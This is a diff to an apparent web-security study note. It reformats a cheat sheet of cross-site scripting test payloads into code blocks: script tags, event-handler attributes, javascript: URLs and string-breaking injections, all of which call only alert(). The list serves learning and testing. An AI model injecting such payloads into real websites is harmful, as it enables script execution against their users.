@@ -64,15 +64,41 @@ Understanding how these sanitization methods work is key to learning about web s
 ## Cheatsheet
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 
-- ```<script>alert('xss')</script>```
-- ```<img src='x' onerror="alert('xss')">```
-- ```<img src='x' onload="alert('xss')">```
-- ```<body onload="alert('xss')"/>```
-- ```<iframe src="javascript:alert('xss')">```
-- ```javascript:alert(3)```
-- ```';alert('xss');//```
-- ```<bla onfocus="alert(2)" tabindex="1">spider</bla>```
-- ```var message = `0 search results for '${alert(222)}'`;```
+```html
+<script>alert('xss')</script>
+```
+
+```html
+<img src='x' onerror="alert('xss')">
+```
+
+```html
+<img src='x' onload="alert('xss')">
+```
+
+```html
+<body onload="alert('xss')"/>
+```
+
+```html
+<iframe src="javascript:alert('xss')">
+```
+
+```javascript
+javascript:alert(3)
+```
+
+```javascript
+';alert('xss');//
+```
+
+```html
+<bla onfocus="alert(2)" tabindex="1">spider</bla>
+```
+
+```javascript
+var message = `0 search results for '${alert(222)}'`;
+```
 
 Escape html tags
 
